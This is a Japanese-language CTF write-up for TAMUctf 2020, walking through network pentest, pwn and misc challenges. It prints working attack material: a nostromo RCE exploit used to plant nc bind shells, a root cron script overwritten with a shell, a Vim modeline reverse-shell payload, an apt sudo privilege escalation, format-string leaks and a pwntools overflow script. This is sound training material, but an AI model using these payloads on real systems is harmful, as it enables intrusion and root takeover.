---
title: "TAMUctf 2020 Writeup"
date: 2020-03-30T15:30:00+09:00
lastmod: 2020-03-30T15:30:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Ftamuctf_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://tamuctf.com/challenges](https://tamuctf.com/challenges)
<br /><br />
Network Pentestのチャレンジがあったり、とても面白かったです！！

ちょうど2月末くらいからHack The BoxでMachineを攻略し始めていて、それがとても役に立ちました。

サーバもとても安定していて、よかったですね。

<br>
以下がスコアです。

<img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score1.png" alt="tamuctf_2020_Score1.png">

<img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score2.png" alt="tamuctf_2020_Score2.png">

<br /><br />



## [Network Pentest]: MY_FIRST_BLOG
- - -
### Challenge
> Here is a link to my new blog! I read about a bunch of exploits in common server side blog tools so I just decided to make my website static. Hopefully that should keep it secure.
<br /><br />
Root owns the flag.
<br /><br />
http://172.30.0.2/

Attachment:

- my-first-blog.ovpn


<br />
### Solution
まず、nmapです。とりあえずサクっと Version Scan だけしてみました。

<pre>
captureamerica@kali:~/Downloads$ nmap -sV 172.30.0.2 -p 80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 08:42 +08
Nmap scan report for 172.30.0.2
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nostromo 1.9.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
</pre>

<br>
ウェブサーバがnostromoというので動いているようです。searchsploitでexploitを探します。

<pre>
captureamerica@kali:~/Downloads$ searchsploit nostromo
----------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                           |  Path
                                                                                         | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                     | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                   | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                     | exploits/linux/remote/35466.sh
----------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</pre>

<br>
2番目の47837.pyがよさそうです。バージョン1.9.6も同じだし、RCEだし。

ダウンロードして、いちおう文字コードも直しておきます。

<pre>
captureamerica@kali:~/Downloads$ searchsploit -m exploits/multiple/remote/47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/captureamerica/Downloads/47837.py


captureamerica@kali:~/Downloads$ nkf -w -Lu --overwrite 47837.py 
</pre>

<br>
あ、あと、47837.py のアタマの方にコメント等が入っているので、消しておかないとエラーになります。

ちなみに、CVE-2019-16278のようです。

引数で任意のコマンドが指定できるようです。バックドアをしかけます。

<pre>
captureamerica@kali:~/Downloads$ ./47837.py 172.30.0.2 80 "nc -l -p 3333 -e /bin/bash"


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    


</pre>

<br>
これで、別のターミナルからncで繋ぐことができます。

<pre>
captureamerica@kali:~/Downloads$ nc 172.30.0.2 3333
id
uid=1000(webserver) gid=1000(webserver) groups=1000(webserver)

</pre>


<br>
いろいろ探した結果、crontabの中で以下が見つかりました。/usr/bin/healthcheck がroot権限で動いているようです。

<pre>
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/bin/healthcheck
</pre>

<br>
しかも、パーミッションが777です。
<pre>
ls -l /usr/bin/ | grep healthcheck
-rwxrwxrwx 1 root root         98 Mar 19 18:41 healthcheck
</pre>


<br>
ここでうっかりファイルの中身を消してしまい、DiscordでAdminの人にゴメンナサイしたところ、サーバはチーム毎にあるから好きにしていいよ、とのことでした。

ということで、

<pre>
cd /usr/bin/
echo "nc -l -p 4444 -e /bin/bash" > healthcheck
</pre>

<br>
ただし、これはなぜか動かなかったので、違うポート番号（123）で試したらいけました。

<pre>
echo "nc -l -p 123 -e /bin/bash" > healthcheck
</pre>

<br>
<pre>
captureamerica@kali:~/Downloads$ nc 172.30.0.2 123
id
uid=0(root) gid=0(root) groups=0(root)
ls -l /root
total 4
-rw-rw-r-- 1 root root 29 Mar 19 18:41 flag.txt
cat flag.txt
gigem{l1m17_y0ur_p3rm15510n5}
</pre>

<br>
Flag: `gigem{l1m17_y0ur_p3rm15510n5}`


<br /><br />
<br /><br />
## [Network Pentest]: OBITUARY_1 & OBITUARY_2
- - -
### Challenge
> Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.
<br /><br />
You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!
<br /><br />
NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.

Attachment:

- obituary.ovpn


<br />
### Solution
まず、nmapします。

<pre>
captureamerica@kali:~/Downloads$ sudo nmap -sV -sC -oA nmap 172.30.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 11:20 +08
Nmap scan report for 172.30.0.2
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4321/tcp open  rwhois?
MAC Address: 02:42:EE:81:CE:1E (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.42 seconds
</pre>

<br>
変なポート (4321) が一個開いているだけでした。

<br>
Vimがなんじゃらって言っているので、Vimに関する脆弱性を探して、以下が見つかりました。

https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf






<br>
正直、意味がわからないですが、コピペ＆編集して以下のようなテキストファイルを作ります。ファイル名は、vim_cmd.txtにしました。(172.30.0.14は自分のIPです。)

<pre>
:!nc -nv 172.30.0.14 4444 -e /bin/sh ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
</pre>

<br>
チャレンジ文より、"shoot me over your latest version of the code" とのことなので、こいつを投げてみます。

別ターミナルで `nc -l -p 4444` で待受けをしておいて、以下のコマンドで投げます。

<pre>
nc 172.30.0.2 4321 < vim_cmd.txt
</pre>

<br>
繋がりました。

<pre>
captureamerica@kali:~/CTF/TAMUctf_2020/Obituary$ nc -l -p 4444
id
uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)
</pre>


<br>
このユーザ（mwazowski）が所有するファイルをみてみます。
<pre>
find / -user mwazowski
:
(略)
:
/proc/772/patch_state
/run/screen/S-mwazowski
/run/screen/S-mwazowski/756.Jw7hxfsUAP
/tmp/.tmp.Jw7hxfsUAP.swp
/home/mwazowski
/home/mwazowski/.profile
/home/mwazowski/.bashrc
/home/mwazowski/.bash_logout
/home/mwazowski/.viminfo
/dev/pts/0
:
:
</pre>

<br>
どうやら、screenを使っているようです。

<pre>
screen -ls
There is a screen on:
	756.Jw7hxfsUAP	(03/20/20 03:33:45)	(Detached)
1 Socket in /run/screen/S-mwazowski.
screen -r 756
Must be connected to a terminal.
pwd
/tmp
python -c 'import pty; pty.spawn("/bin/bash");'
screen -r 756
Must be connected to a terminal.
</pre>

<br>
このterminalなんじゃらのエラー("Must be connected to a terminal")は、ちょっとググったところ `script /dev/null` で直るとのこと。

<pre>
script /dev/null
Script started, file is /dev/null
mwazowski@97c3648d9667:/tmp$ cd /home
cd /home
lmwazowski@97c3648d9667:/home$ls -la
ls -la
total 16
drwxr-xr-x 1 root      root      4096 Mar 19 02:06 .
drwxr-xr-x 1 root      root      4096 Mar 20 03:19 ..
drwxr-xr-x 1 mwazowski mwazowski 4096 Mar 20 03:31 mwazowski
mwazowski@97c3648d9667:/home$ cd mwazowski
cd mwazowski
mwazowski@97c3648d9667:~$ ls -la
ls -la
total 48
drwxr-xr-x 1 mwazowski mwazowski  4096 Mar 20 03:31 .
drwxr-xr-x 1 root      root       4096 Mar 19 02:06 ..
-rw-r--r-- 1 mwazowski mwazowski   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 mwazowski mwazowski  3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 mwazowski mwazowski   807 Apr 18  2019 .profile
-rw------- 1 mwazowski mwazowski 10201 Mar 20 03:31 .viminfo
-rw-rw-r-- 1 root      root         28 Mar 19 00:40 flag.txt
-rw-r--r-- 1 root      root         96 Mar 19 02:06 manually_installed_packages.txt
-rw-rw-r-- 1 root      root        342 Mar 19 00:40 note_to_self.txt
mwazowski@97c3648d9667:~$ cat flag.txt
cat flag.txt
gigem{ca7_1s7_t0_mak3_suRe}
</pre>

<br>
ユーザフラグ、ゲットです。

Flag: `gigem{ca7_1s7_t0_mak3_suRe}`


<br /><br />
<br /><br />
次はrootのフラグです。

<pre>
mwazowski@97c3648d9667:~$ sudo -l
sudo -l
Matching Defaults entries for mwazowski on 97c3648d9667:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mwazowski may run the following commands on 97c3648d9667:
    (root) NOPASSWD: /usr/bin/apt
</pre>

<br>
aptが実行できるみたいです。

ここで、aptを使った権限昇格をググって調べました。以下がやり方です。


<pre>
mwazowski@97c3648d9667:~$ sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"

root@97c3648d9667:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@97c3648d9667:/tmp# cd /root
cd /root
root@97c3648d9667:~# ls  
ls 
flag.txt
root@97c3648d9667:~# cat flag.txt
cat flag.txt
gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}
</pre>

<br>
rootのフラグ、ゲットです。

Flag: `gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}`



<br /><br />
<br /><br />
## [Pwn]: ECHO_AS_A_SERVICE
- - -
### Challenge
> Echo as a service (EaaS) is going to be the newest hot startup! We've tapped a big market: Developers who really like SaaS.
<br /><br />
nc challenges.tamuctf.com 4251

Attachment:

- echoasaservice (ELF 64bit)


<br />
### Solution
まずはサーバに繋いでみて、動きを確認します。

<pre>
captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
Echo as a service (EaaS)
hello
hello
Echo as a service (EaaS)
test
test
Echo as a service (EaaS)
flag
flag
Echo as a service (EaaS)
bye
bye
Echo as a service (EaaS)
^C
</pre>

<br>
入力した文字列がそのままEcho backされてくるだけです。

<br>
Ghidraでソースを調べます。

{{< highlight c "linenos=table,hl_lines=19" >}}
void main(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_48 [32];
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x2,0,0);
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) {
    fgets(local_48,0x19,__stream);
  }
  do {
    puts("Echo as a service (EaaS)");
    gets(local_28);
    printf(local_28);
    putchar(10);
  } while( true );
}
{{< / highlight >}}

FSB (Format String Bug) がありますね。（printf(local_28);の箇所）


<br>
テキトーに %1$s から順番に見ていけばそのうちフラグが出るだろうと思ってやってみたんですが、全然出てこない。。。

<br>
ローカルでちょこちょこテストしていたところ、`%8$p` `%9$p` 辺りで文字列になりそうな数字が出ているのに気づきました。

しかも、順番がreverseになってます。

<pre>
0x6c667b6d65676967
lf{megig

0x7d757365645f6761
}used_ga
</pre>

<br>

ということで、CTFサーバ側にも同様なことをやってみます。
<pre>
captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
Echo as a service (EaaS)
%8$p
0x61337b6d65676967
Echo as a service (EaaS)
%9$p
0x616d7230665f7973
Echo as a service (EaaS)
%10$p
0x7d316e6c75765f74
Echo as a service (EaaS)
%11$p
(nil)
Echo as a service (EaaS)
</pre>

<br>
以下のように文字列に変換しました。

<pre>
captureamerica@kali:~/CTF/TAMUctf_2020$ unhex 7d316e6c75765f74616d7230665f797361337b6d65676967 | rev ; echo
gigem{3asy_f0rmat_vuln1}
</pre>


Flag: `gigem{3asy_f0rmat_vuln1}`



<br /><br />
<br /><br />
## [Pwn]: TROLL
- - -
### Challenge
> There's a troll who thinks his challenge won't be solved until the heat death of the universe.
<br /><br />
nc challenges.tamuctf.com 4765

Attachment:

- troll (ELF 64bit)


<br />
### Solution

Ghidraでソースを調べます。

{{< highlight c "linenos=table,hl_lines=6 14 16 19" >}}
undefined8 main(void)

{
  int iVar1;
  char local_98 [64];
  char local_58 [44];
  int local_2c;
  FILE *local_28;
  int local_1c;
  time_t local_18;
  int local_c;
  
  setvbuf(stdout,(char *)0x2,0,0);
  local_18 = time((time_t *)0x0);
  puts("Who goes there?");
  gets(local_58);
  printf("Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\n",
         local_58);
  srand((uint)local_18);
  local_c = 0;
  while( true ) {
    if (99 < local_c) {
      puts("You\'ve guessed all of my numbers. Here is your reward.");
      local_28 = fopen("flag.txt","r");
      if (local_28 != (FILE *)0x0) {
        fgets(local_98,0x40,local_28);
        puts(local_98);
      }
      puts("Goodbye.");
      return 0;
    }
    iVar1 = rand();
    local_1c = iVar1 % 100000 + 1;
    puts("I am thinking of a number from 1-100000. What is it?");
    __isoc99_scanf(&DAT_001020a5,&local_2c);
    if (local_1c != local_2c) break;
    puts("Impressive.");
    local_c = local_c + 1;
  }
  puts("You have failed. Goodbye.");
  return 0;
}
{{< / highlight >}}

やっていること：

1. time()で時間を取る<br>
2. 上記の値を使ってsrand()コール<br>
3. rand()を使って、1~100000の乱数を生成<br>
4. これを99回ぴったり予想できたらフラグ表示<br>

だいたい、こんな感じ。だと思います。

<br>
どうして最初に名前を入力する箇所があるのかを考えると、BOFを使ってsrand()の引数を初期化し乱数を固定する、というのが解法のようですね。

<br>
名前は `local_58[44]` に入るので、srand()の引数になっている `local_18` を上書きするには、他のローカル変数等を考慮すると76バイト(44+32)に必要になります。

全部 'A' で埋めちゃうことにします。

<br>
別途Cでコードを書いて、0x4141414141414141をシードにしたときの乱数のリストを予め計算しておきます。

```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main()
{
	int iVar1;
	int local_1c;
	time_t local_18;
	int local_c;
	
	local_18 = time((time_t *)0x0);
	local_18 = 0x4141414141414141;
	srand(local_18);
	local_c = 0;
	while( 1 ) {
		if (99 < local_c) {
			break;
		}
		iVar1 = rand();
		local_1c = iVar1 % 100000 + 1;
		printf("0x%x\n", local_1c);
		local_c = local_c + 1;
	}
}
```

<br>
Pwnのコードです。

```Python
#!/usr/bin/env python
from pwn import *

if 0:
    s = process('./troll')
else:
    s = remote('challenges.tamuctf.com', 4765)

ans = [0x6e01,0xe18f,0xe4f8,0xc5a9,0xa2c5,0x13c9f,0x330a,0xc382,0x10c13,0x444,0x160cc,0x1427e,0x826f,0x748c,0xd291,0xca0f,0xc122,0x7e9d,0x16c7e,0x1801e,0xcf4b,0x604,0x30d4,0xd9a1,0x4fac,0x12498,0x1847e,0x14eba,0x14529,0xfeaa,0x72b6,0x2c89,0x5998,0x10ed,0x13212,0x13c3d,0x14d8c,0x1651b,0xb8fe,0xd2fe,0x229e,0x9329,0x8edb,0xa50d,0x14795,0x1aab,0x285b,0x8216,0x9948,0x4e18,0x7b93,0x21d2,0x541b,0xac66,0xfb72,0xe3a7,0x8a3d,0xf94f,0xabc0,0x48c5,0xb139,0x15e55,0xb52e,0x10ad0,0x2882,0x609f,0x1004c,0x1760d,0x7ef9,0x32a9,0x1024a,0xa196,0x105b2,0x4a64,0x18682,0xc6a6,0x650f,0x283c,0x148bb,0x13e36,0x7654,0x3dad,0x16007,0x10a4e,0xea12,0x114b9,0xa734,0x2d8e,0xc747,0xc33,0x7652,0x1787f,0x16a88,0x12b7f,0xfcaf,0xc69,0x455d,0xb63a,0x3bb5,0xc455]
    
payload = b'A' * (44+32)
s.sendlineafter("Who goes there?\n", payload)


for i in range(len(ans)+1):
    msg = s.recvregex('I am thinking of a number from 1-100000. What is it?|You.*')
    if "You" in msg:
        msg = s.recvall()
        print(msg)
        s.close()
        break

    print(msg)
    s.sendline(str(ans[i]))
    print("0x{:x}".format(ans[i]))
    msg = s.recvline()  # Impressive
    print(msg)

```

<br>
Flag `gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}`



<br /><br />
<br /><br />
## [Misc]: CORRUPTED_DISK
- - -
### Challenge
> We've recovered this disk image but it seems to be damaged. Can you recover any useful information from it?

Attachment:

- recovered_disk.img


<br />
### Solution
これは、foremostで取れました。

Flag: `gigem{wh3r3_w3r3_601n6_w3_d0n7_n33d_h34d3r5}`



<br /><br />
<br /><br />
## [Misc]: ZIPPITY_DOO_DAH
- - -
### Challenge
> Lorelei, a nuclear engineer, is practicing how to create folders to organize her notes. She works closely with POTUS to secure our nuclear missiles. In order for her to send the nuclear codes to the correct authorities, she needs to zip all the files and make the data hard to find. Your mission, should you choose to accept it, is to intercept and find the codes (the flag).

Attachment:

- zipFolder.zip


<br />
### Solution
Zipを解凍すると大量にテキストファイルが出てくるんですが、テキストファイルは全部Decoyで、フラグはZipの中にあった画像ファイルからzstegで取れます。

<pre>
=== zsteg ===
b1,rgb,lsb,xy       .. text: "gigem{z1pT4st1c__$kiLl$$$}"
</pre>

<br>
Flag: `gigem{z1pT4st1c__$kiLl$$$}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

